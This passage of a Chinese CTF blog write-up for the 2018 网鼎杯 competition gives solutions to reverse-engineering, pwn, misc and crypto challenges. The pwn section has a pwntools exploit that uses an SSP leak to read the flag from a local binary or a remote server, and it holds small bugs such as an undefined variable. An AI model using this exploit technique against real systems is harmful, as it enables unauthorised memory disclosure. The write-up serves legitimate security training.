class="number">-0xe8</span>)==<span class="number">0x2f6</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xdc</span>)==<span class="number">0x2dd</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">model = s.model()</span><br><span class="line">ans = [model[a],model[b],model[c],model[d],model[e],model[f],model[g],model[h], model[i],model[j],model[k],model[l],model[m],model[n],model[o],model[p],<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line">flag = <span class="string">''</span>.join([chr(int(str(x))) <span class="keyword">for</span> x <span class="keyword">in</span> ans])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>漏洞点很明显，<code>gets</code>处可以溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3L</span>L;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">"./flag.txt"</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"./flag.txt"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();                          <span class="comment">// fork()</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);</span><br><span class="line">  gets((__int64)&amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;buf, &amp;s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checksec后发现开了<code>Canary</code>。<code>Canary</code>检查失败的时候调用<code>__stack_chk_fail</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的<code>__fortify_fail</code>打印出了<code>__libc_argv[0]</code>所指向字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p>可以通过覆盖<code>__libc_argv[0]</code>实现读取想要的数据，也就是<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">SSP（Stack Smashing Protector） Leak</a>。调试过程中有一个比较容易获取指针的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p &amp;__libc_argv[0]</span><br><span class="line">$1 = (char **) 0x7fffffffe4c8</span><br></pre></td></tr></table></figure>
<p>然后因为libc导出了一个符号<a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">environ</a>，其值和<code>main</code>函数的第三个参数<code>envp</code>一样。这样的话，只要泄漏出libc的基址就可以得到栈上的地址。</p>
<p>三次进程正好分为：</p>
<ol>
<li>利用got表得到libc地址</li>
<li>利用libc的environ得到stack地址</li>
<li>计算flag地址并输出</li>
</ol>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./guess'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.90.160'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">buf = <span class="number">0x7fffffffe4d0</span></span><br><span class="line">argv_0 = <span class="number">0x7fffffffe5f8</span></span><br><span class="line">offset1 = argv_0 - gets</span><br><span class="line">offset2 = <span class="number">0x7ffd12119a88</span> - <span class="number">0x7ffd12119920</span></span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>] <span class="comment"># 0x602058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got ==&gt; libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">gets_got = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(gets_got)</span><br><span class="line">libc_base = gets_got - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ==&gt; environ ==&gt; stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'B'</span> * offset1 + p64(stack - offset2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>取出Alpha0和Green0通道的图片后异或得到flag。</p>
<p><img src="/pics/2018-网鼎杯-writeup/minified/1.PNG" alt="Alpha0"></p>
<p><img src="/pics/2018-网鼎杯-writeup/minified/2.PNG" alt="Green0"></p>
<p><img src="/pics/2018-网鼎杯-writeup/minified/3.PNG" alt="flag"></p>
<h2 id="双色块"><a href="#双色块" class="headerlink" title="双色块"></a>双色块</h2><p>先上binwalk得到图片，key为ctfer2333。</p>
<p>尝试把gif每一个帧拼凑成图片，发现无法得到一个正常的二维码。</p>
<p>再猜测将紫色与绿色色块分别表示1和0，先提取出每张图片：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(gif_file)</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    img = Image.open(gif_file)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            current = img.tell()</span><br><span class="line">            <span class="keyword">print</span> current</span><br><span class="line">            img.save(png_dir + str(current + <span class="number">1</span>) + <span class="string">'.png'</span>)</span><br><span class="line">            img.seek(current + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gif_file = <span class="string">'out.gif'</span></span><br><span class="line">    main(gif_file)</span><br></pre></td></tr></table></figure>
<p>再读取图片内容，转换成0和1，最后每8位转为一个ascii字符：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">        line = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">            file_name = <span class="string">'frame/'</span> + str(i * <span class="number">24</span> + j + <span class="number">1</span>) + <span class="string">'.png'</span></span><br><span class="line">            x = j * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            y = i * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            img = Image.open(file_name)</span><br><span class="line">            img = img.convert(<span class="string">'RGB'</span>) </span><br><span class="line">            img_array = img.load()</span><br><span class="line">            r, g, b = p = img_array[x, y]</span><br><span class="line">            <span class="keyword">if</span> g == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'0'</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">8</span>:</span><br><span class="line">                ret += chr(int(line, <span class="number">2</span>))</span><br><span class="line">                line = <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>去掉得到的字符串后面的hhhhh，因为明显不像加密后的内容，尝试base64无果后，用DES解密，密钥即为一开始得到的ctfer2333，得到flag。</p>
<h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>解压后用cat把所有的文件合并，得到一个zip文件，爆破密码得到flag。</p>
<p><img src="/pics/2018-网鼎杯-writeup/welcome/1.png" alt="爆破结果"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="shanghai"><a href="#shanghai" class="headerlink" title="shanghai"></a>shanghai</h2><p>维吉尼亚解密，<a href="https://guballa.de/vigenere-solver" target="_blank" rel="noopener">在线解密</a>，直接得到flag。</p>
<p><img src="/pics/2018-网鼎杯-writeup/shanghai/1.png" alt="flag"></p>
<p>同时还得到密钥是icqvigenere。</p>
<h2 id="apl"><a href="#apl" class="headerlink" title="apl"></a>apl</h2><p>之前PladCTF有<a href="https://monosource.github.io/writeup/2018/05/08/plaidctf-aplunatics/" target="_blank" rel="noopener">一道类似的题目</a>，在xman的时候也分析过。</p>
<p>apl最大的特点是从右往左计算。<code>⍵</code>代表右侧的变量，<code>α</code>代表左侧的变量。</p>
<p>一开始给了一长串base64字符串，解密后得到apl：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;⍵(~⍵)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)&#123;+/⍺≠33+2⊥(1(5)×8)⍴∊&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)&#125;&apos;YourFlagIsWhat?&apos;</span><br></pre></td></tr></table></figure>
<p>先分成几个部分：</p>
<ol>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. ```(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)``` ==&gt; ```181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146</span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">再通过主要加密过程分析，根据apl的特性应该倒着来：</span><br><span class="line"></span><br><span class="line">1. `(1+(|¯8)⍴1)⊤⎕UCS(⍵)` ==&gt; 将ascii转换成二进制</span><br><span class="line">2. `(∊4(⍴⍴88888)+16)` ==&gt; 20 16，即将右侧的矩阵填充为20*16</span><br><span class="line">3. `10⊖⊖⌽` ==&gt; 将矩阵的行倒序，列向上位移10</span><br><span class="line">4. `8(⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)` ==&gt; 8 40，即将右侧的矩阵填充为8*40</span><br><span class="line">5. `2⊥` ==&gt; 将二进制转换成ascii</span><br><span class="line">6. `&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;` ==&gt; x ^ (x &gt;&gt; 1)</span><br><span class="line">7. `+/⍺≠33+2⊥(1(5)×8)` ==&gt; `¨`按列读取矩阵，然后经过上一步的移位异或，转为ascii码并加上33</span><br><span class="line"></span><br><span class="line">接下来按步骤逆向即可：</span><br><span class="line"></span><br><span class="line">```apl</span><br><span class="line">⎕UCS(2⊥(8 40)⍴⌽⊖10⊖(20 16)⍴(8⍴2)⊤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38))</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://www.anquanke.com/post/id/158386#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158386#h3-5</a><br><a href="https://xz.aliyun.com/t/2665" target="_blank" rel="noopener">https://xz.aliyun.com/t/2665</a><br><a href="https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w</a><br><a href="https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/" target="_blank" rel="noopener">https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/</a><br><a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism</a><br><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/81950438" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/81950438</a><br><a href="https://xz.aliyun.com/t/2614" target="_blank" rel="noopener">https://xz.aliyun.com/t/2614</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/82217266" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/82217266</a><br><a href="https://xz.aliyun.com/t/2666" target="_blank" rel="noopener">https://xz.aliyun.com/t/2666</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/10/16/2018-护网杯-review/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2018-护网杯-writeup
        
      </div>
    </a>
  
  
    <a href="/2018/09/10/2018-noxCTF-writeup/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2018-noxCTF-writeup</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">1.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#beijing"><span class="nav-number">1.1.</span> <span class="nav-text">beijing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#advanced"><span class="nav-number">1.2.</span> <span class="nav-text">advanced</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blend"><span class="nav-number">1.3.</span> <span class="nav-text">blend</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUESS"><span class="nav-number">2.1.</span> <span class="nav-text">GUESS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#minified"><span class="nav-number">3.1.</span> <span class="nav-text">minified</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双色块"><span class="nav-number">3.2.</span> <span class="nav-text">双色块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#welcome"><span class="nav-number">3.3.</span> <span class="nav-text">welcome</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shanghai"><span class="nav-number">4.1.</span> <span class="nav-text">shanghai</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apl"><span class="nav-number">4.2.</span> <span class="nav-text">apl</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">5.</span> <span class="nav-text">参考网站</span></a></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
